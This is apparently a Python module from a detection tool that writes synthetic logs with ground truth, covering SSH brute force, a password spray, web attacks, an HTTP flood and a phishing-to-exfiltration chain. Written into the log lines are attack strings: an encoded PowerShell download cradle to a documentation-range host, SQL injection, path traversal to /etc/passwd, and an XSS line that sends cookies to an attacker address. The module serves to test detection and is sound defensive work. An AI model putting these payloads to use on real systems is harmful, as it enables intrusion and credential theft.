"""Synthetic log generator with ground truth.

Real attack logs are hard to share legally, so this module writes realistic
log lines in five real formats: a baseline of ordinary activity, a set of
attack scenarios, and a handful of benign look-alikes that are designed to
sit just under each rule's threshold (to prove the rules do not over-fire).

Every attack it injects is written down in a ground-truth list, which lets
`sentinel evaluate` measure what the pipeline caught and what it missed.

Attacker addresses all come from the RFC 5737 documentation ranges
(192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) so no real network is ever
labelled malicious. Ordinary clients come from 100.64.0.0/10 (RFC 6598).
"""
from __future__ import annotations

import base64
import json
import random
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

Line = Tuple[float, str, str]   # (epoch, parser name, raw line)

FILES = {"sshd": "auth.log", "nginx": "access.log", "ufw": "ufw.log",
         "zeek": "conn.log", "windows": "winevent.jsonl"}

BROWSERS = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
]
PAGES = ["/", "/products", "/products?id=12", "/products?id=87", "/cart", "/checkout",
         "/about", "/blog", "/blog/how-to-select-a-union-representative",
         "/static/app.js", "/static/site.css", "/api/v1/stock?sku=A-1042", "/login"]
SPRAY_USERS = ["admin", "jsmith", "mlopez", "akim", "backup", "oracle", "test"]
WORDLIST = ["admin", "backup", ".git/config", "wp-login.php", "phpmyadmin", ".env",
            "config.php.bak", "server-status", "api/debug", "old", "test", "db.sql",
            "console", "actuator/health", "uploads", "cgi-bin/test.cgi", "private",
            "staging", "adminer.php", "id_rsa", "dump.zip", "login.aspx", "manager/html",
            "vendor/phpunit", "solr", "jenkins", "shell.php", "info.php", "web.config",
            "backup.tar.gz", "user/register", "xmlrpc.php"]


# ------------------------------------------------------------ line formatters
def _syslog(ts: float) -> str:
    d = datetime.fromtimestamp(ts, tz=timezone.utc)
    return "%s %2d %s" % (d.strftime("%b"), d.day, d.strftime("%H:%M:%S"))


def ssh_fail(ts, host, user, ip, invalid=False, rng=random) -> Line:
    return ts, "sshd", "%s %s sshd[%d]: Failed password for %s%s from %s port %d ssh2" % (
        _syslog(ts), host, rng.randint(1000, 30000), "invalid user " if invalid else "",
        user, ip, rng.randint(30000, 65000))


def ssh_ok(ts, host, user, ip, method="publickey", rng=random) -> Line:
    return ts, "sshd", "%s %s sshd[%d]: Accepted %s for %s from %s port %d ssh2" % (
        _syslog(ts), host, rng.randint(1000, 30000), method, user, ip,
        rng.randint(30000, 65000))


def sudo(ts, host, user, command) -> Line:
    return ts, "sshd", "%s %s sudo:   %s : TTY=pts/0 ; PWD=/home/%s ; USER=root ; COMMAND=%s" % (
        _syslog(ts), host, user, user, command)


def useradd(ts, host, name) -> Line:
    return ts, "sshd", ("%s %s useradd[4121]: new user: name=%s, UID=1007, GID=1007, "
                        "home=/home/%s, shell=/bin/bash, from=/dev/pts/0") % (
        _syslog(ts), host, name, name)


def web(ts, ip, url, status=200, size=5120, agent=None, method="GET") -> Line:
    d = datetime.fromtimestamp(ts, tz=timezone.utc).strftime("%d/%b/%Y:%H:%M:%S +0000")
    return ts, "nginx", '%s - - [%s] "%s %s HTTP/1.1" %d %d "-" "%s"' % (
        ip, d, method, url, status, size, agent or BROWSERS[0])


def ufw(ts, src, dst, port, verdict="BLOCK", host="fw-01") -> Line:
    return ts, "ufw", ("%s %s kernel: [UFW %s] IN=eth0 OUT= MAC=00:16:3e:5e:6c:00 SRC=%s "
                       "DST=%s LEN=60 TOS=0x00 PREC=0x00 TTL=52 ID=54321 DF PROTO=TCP "
                       "SPT=%d DPT=%d WINDOW=64240 RES=0x00 SYN URGP=0") % (
        _syslog(ts), host, verdict, src, dst, 40000 + port % 20000, port)


def zeek(ts, src, dst, port, out_bytes, in_bytes, duration=1.5, service="ssl") -> Line:
    return ts, "zeek", json.dumps({
        "ts": round(ts, 3), "uid": "C%08x" % (int(ts * 1000) % 0xFFFFFFFF),
        "id.orig_h": src, "id.resp_h": dst, "id.resp_p": port, "proto": "tcp",
        "service": service, "duration": duration, "orig_bytes": out_bytes,
        "resp_bytes": in_bytes, "conn_state": "SF"})


def win(ts, host, event_id, data: Dict[str, Any]) -> Line:
    stamp = datetime.fromtimestamp(ts, tz=timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000Z")
    return ts, "windows", json.dumps({
        "@timestamp": stamp,
        "winlog": {"event_id": event_id, "computer_name": host,
                   "channel": "Security", "event_data": data}})


def encoded_powershell() -> str:
    script = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.200/a.ps1')"
    blob = base64.b64encode(script.encode("utf-16-le")).decode()
    return "powershell.exe -NoProfile -WindowStyle Hidden -enc " + blob


# ------------------------------------------------------------------ scenarios
class Scenarios:
    """Each scenario returns (lines, expected detections). `pace` stretches
    or squeezes time: 1.0 for the recorded demo, small values for the live
    "launch an attack" button so that it plays out in seconds."""

    def __init__(self, rng: random.Random):
        self.rng = rng

    def _expect(self, name, rule_id, entity, lines):
        return {"scenario": name, "rule_id": rule_id, "entity": entity,
                "start": lines[0][0], "end": lines[-1][0]}

    def web_attack(self, t0: float, ip="203.0.113.66", pace=1.0):
        name, lines = "Web application attack", []
        t = t0
        for word in self.rng.sample(WORDLIST, len(WORDLIST)) + WORDLIST[:8]:
            t += 1.2 * pace
            lines.append(web(t, ip, "/" + word, 404, 162, "Mozilla/5.00 (Nikto/2.5.0)"))
        attacks = [
            "/products?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--",
            "/item?id=1%2527%2520OR%2520%25271%2527%253D%25271",
            "/products?id=1;%20DROP%20TABLE%20orders--",
            "/download?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd",
            "/static/..%2F..%2F..%2Fproc/self/environ",
            "/search?q=%3Cscript%3Efetch(%27//203.0.113.66/c?%27+document.cookie)%3C/script%3E",
            "/profile?name=%3Cimg%20src=x%20onerror=alert(1)%3E",
        ]
        for url in attacks:
            t += 20 * pace
            lines.append(web(t, ip, url, 200 if "UNION" in url else 403, 2840, "sqlmap/1.8.4#stable"))
        expected = [self._expect(name, r, ip, lines)
                    for r in ("SEN-007", "SEN-008", "SEN-004", "SEN-006", "SEN-005")]
        return lines, expected

    def ssh_intrusion(self, t0: float, ip="198.51.100.23", host="bastion-01", pace=1.0):
        name, lines = "SSH intrusion", []
        t = t0
        ports = [21, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 1433, 1521,
                 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9200, 11211, 27017]
        for port in ports:
            t += 0.8 * pace
            lines.append(ufw(t, ip, "10.0.1.5", port))
        lines.append(ufw(t + pace, ip, "10.0.1.5", 22, verdict="ALLOW"))
        t += 120 * pace
        for _ in range(22):
            t += 3 * pace
            user = self.rng.choice(["root", "admin", "deploy", "ubuntu"])
            lines.append(ssh_fail(t, host, user, ip, invalid=user in ("admin", "ubuntu"),
                                  rng=self.rng))
        t += 4 * pace
        lines.append(ssh_ok(t, host, "deploy", ip, method="password", rng=self.rng))
        t += 90 * pace
        lines.append(sudo(t, host, "deploy", "/usr/bin/cat /etc/shadow"))
        t += 60 * pace
        lines.append(useradd(t, host, "svc_backup"))
        expected = [self._expect(name, r, ip, lines) for r in ("SEN-009", "SEN-001", "SEN-003")]
        expected += [self._expect(name, r, host, lines) for r in ("SEN-016", "SEN-013")]
        return lines, expected

    def password_spray(self, t0: float, ip="192.0.2.77", host="bastion-01", pace=1.0):
        lines = []
        for i, user in enumerate(SPRAY_USERS):
            lines.append(ssh_fail(t0 + i * 35 * pace, host, user, ip,
                                  invalid=user in ("oracle", "test"), rng=self.rng))
        return lines, [self._expect("Password spray", "SEN-002", ip, lines)]

    def endpoint_compromise(self, t0: float, host="WS-014", host_ip="10.0.5.14",
                            c2="203.0.113.200", drop="198.51.100.150", pace=1.0):
        name, lines, t = "Phishing to data theft", [], t0
        lines.append(win(t, host, 4688, {
            "SubjectUserName": "mlopez",
            "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "ParentProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "CommandLine": encoded_powershell()}))
        for i in range(6):
            lines.append(zeek(t + (30 + i * 60) * pace, host_ip, c2, 443, 420, 3100, 0.4))
        t += 420 * pace
        lines.append(win(t, host, 4720, {"TargetUserName": "helpdesk_svc",
                                         "SubjectUserName": "mlopez"}))
        t += 40 * pace
        lines.append(win(t, host, 4732, {"TargetUserName": "Administrators",
                                         "MemberName": "WS-014\\helpdesk_svc",
                                         "SubjectUserName": "mlopez"}))
        t += 600 * pace
        lines.append(zeek(t, host_ip, drop, 443, 1_288_490_188, 18_400, 412.0))
        t += 120 * pace
        lines.append(win(t, host, 1102, {"SubjectUserName": "helpdesk_svc"}))
        lines.sort(key=lambda item: item[0])
        expected = [self._expect(name, r, host, lines) for r in
                    ("SEN-017", "SEN-012", "SEN-011", "SEN-013", "SEN-014", "SEN-010", "SEN-015")]
        return lines, expected

    def http_flood(self, t0: float, ip="192.0.2.200", pace=1.0, per_minute=900, minutes=2):
        lines = []
        # Start on a minute boundary so the flood fills whole minutes.
        t0 = (int(t0 // 60) + 1) * 60.0
        for i in range(per_minute * minutes):
            lines.append(web(t0 + i * (60.0 / per_minute), ip, "/", 200, 5120,
                             "python-requests/2.32"))
        expected = [{"scenario": "HTTP flood", "rule_id": "SEN-018", "entity": ip,
                     "start": t0, "end": t0 + minutes * 60 + 60}]
        return lines, expected


LIVE_SCENARIOS = ("web_attack", "ssh_intrusion", "password_spray", "endpoint_compromise")


# ------------------------------------------------------------------- baseline
def baseline(rng: random.Random, start: float, minutes: int) -> List[Line]:
    """Ordinary background activity, including deliberate near-misses."""
    lines: List[Line] = []
    clients = ["100.64.%d.%d" % (rng.randint(0, 120), rng.randint(2, 250)) for _ in range(140)]
    for minute in range(minutes):
        base = start + minute * 60
        for _ in range(rng.randint(26, 44)):                       # web shoppers
            status = 200 if rng.random() > 0.03 else rng.choice([301, 304, 404])
            lines.append(web(base + rng.uniform(0, 59.9), rng.choice(clients),
                             rng.choice(PAGES), status, rng.randint(300, 48000),
                             rng.choice(BROWSERS)))
        for _ in range(rng.randint(2, 6)):                         # internet noise
            noisy = "100.%d.%d.%d" % (rng.randint(64, 127), rng.randint(0, 255),
                                      rng.randint(1, 254))
            lines.append(ufw(base + rng.uniform(0, 59.9), noisy, "10.0.1.10",
                             rng.choice([23, 445, 3389, 8080, 5060])))
        for _ in range(rng.randint(3, 8)):                         # normal outbound
            lines.append(zeek(base + rng.uniform(0, 59.9),
                              "10.0.5.%d" % rng.randint(10, 40),
                              "100.%d.%d.%d" % (rng.randint(64, 127), rng.randint(0, 255),
                                                rng.randint(1, 254)),
                              443, rng.randint(800, 900_000), rng.randint(2000, 9_000_000),
                              round(rng.uniform(0.2, 40), 2)))
        if minute % 9 == 0:                                        # admins at work
            lines.append(ssh_ok(base + 12, "bastion-01", rng.choice(["akim", "deploy"]),
                                "100.64.12.%d" % rng.randint(2, 30), rng=rng))
        if minute % 4 == 0:
            host = rng.choice(["WS-014", "WS-022", "dc-01"])
            user = rng.choice(["mlopez", "akim", "jsmith"])
            lines.append(win(base + 20, host, 4624, {"TargetUserName": user,
                                                     "IpAddress": "10.0.5.%d" % rng.randint(10, 40),
                                                     "LogonType": "3"}))
            lines.append(win(base + 31, host, 4688, {
                "SubjectUserName": user,
                "NewProcessName": rng.choice(["C:\\Program Files\\Google\\Chrome\\chrome.exe",
                                              "C:\\Windows\\System32\\notepad.exe",
                                              "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"]),
                "ParentProcessName": "C:\\Windows\\explorer.exe", "CommandLine": ""}))

    # ---- benign look-alikes: each sits just under a rule on purpose ----
    t = start + 15 * 60
    for i in range(3):                       # forgot password, then remembered (SEN-003 needs 5)
        lines.append(ssh_fail(t + i * 9, "bastion-01", "akim", "100.64.12.9", rng=rng))
    lines.append(ssh_ok(t + 40, "bastion-01", "akim", "100.64.12.9", "password", rng=rng))
    t = start + 33 * 60
    for i in range(10):                      # crawler hitting stale links (SEN-008 needs 25)
        lines.append(web(t + i * 4, "100.64.80.14", "/old-catalog/item-%d" % i, 404, 162,
                         "Mozilla/5.0 (compatible; ExampleBot/2.1)"))
    t = start + 58 * 60                      # nightly backup, big but INTERNAL (SEN-010)
    lines.append(zeek(t, "10.0.5.22", "10.0.2.30", 445, 2_254_857_830, 40_000, 610.0, "smb"))
    t = start + 80 * 60                      # IT script, PowerShell but not encoded (SEN-012)
    lines.append(win(t, "WS-022", 4688, {
        "SubjectUserName": "akim",
        "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "ParentProcessName": "C:\\Windows\\explorer.exe",
        "CommandLine": "powershell.exe -ExecutionPolicy Bypass -File C:\\IT\\inventory.ps1"}))
    return lines


LOOKALIKES = [
    {"what": "User fails 3 logins then succeeds", "rule_id": "SEN-003",
     "why_quiet": "Rule needs 5 failures first. People mistype passwords."},
    {"what": "Crawler gets ten 404s in a minute", "rule_id": "SEN-008",
     "why_quiet": "Rule needs 25. Stale links are normal."},
    {"what": "2.2 GB backup to the file server", "rule_id": "SEN-010",
     "why_quiet": "Destination is internal. Only outbound counts."},
    {"what": "PowerShell with -ExecutionPolicy Bypass -File", "rule_id": "SEN-012",
     "why_quiet": "Not encoded, no download cradle. IT does this daily."},
    {"what": "URL containing the words select and union", "rule_id": "SEN-004",
     "why_quiet": "The regex needs SQL syntax (UNION SELECT), not the words."},
]


# ------------------------------------------------------------------ top level
def generate(seed: int = 7, end: Optional[float] = None,
             minutes: int = 180) -> Tuple[List[Line], List[Dict[str, Any]]]:
    """The full recorded demo: baseline plus five attack scenarios."""
    rng = random.Random(seed)
    end = end if end is not None else datetime.now(timezone.utc).timestamp() - 120
    start = (int(end // 60) - minutes) * 60.0
    scenarios = Scenarios(rng)
    lines = baseline(rng, start, minutes)
    truth: List[Dict[str, Any]] = []
    for offset, build in ((20, scenarios.web_attack), (45, scenarios.ssh_intrusion),
                          (72, scenarios.password_spray), (95, scenarios.endpoint_compromise),
                          (150, scenarios.http_flood)):
        new_lines, expected = build(start + offset * 60)
        lines.extend(new_lines)
        truth.extend(expected)
    lines.sort(key=lambda item: item[0])
    return lines, truth


def write_samples(directory: Path, lines: List[Line], truth: List[Dict[str, Any]]) -> List[Path]:
    directory.mkdir(parents=True, exist_ok=True)
    handles = {src: open(directory / name, "w", encoding="utf-8") for src, name in FILES.items()}
    try:
        for _, source, line in lines:
            handles[source].write(line + "\n")
    finally:
        for handle in handles.values():
            handle.close()
    year = datetime.fromtimestamp(lines[0][0], tz=timezone.utc).year
    with open(directory / "ground_truth.json", "w", encoding="utf-8") as handle:
        json.dump({"reference_year": year, "expected": truth, "lookalikes": LOOKALIKES},
                  handle, indent=2)
    return [directory / name for name in FILES.values()]
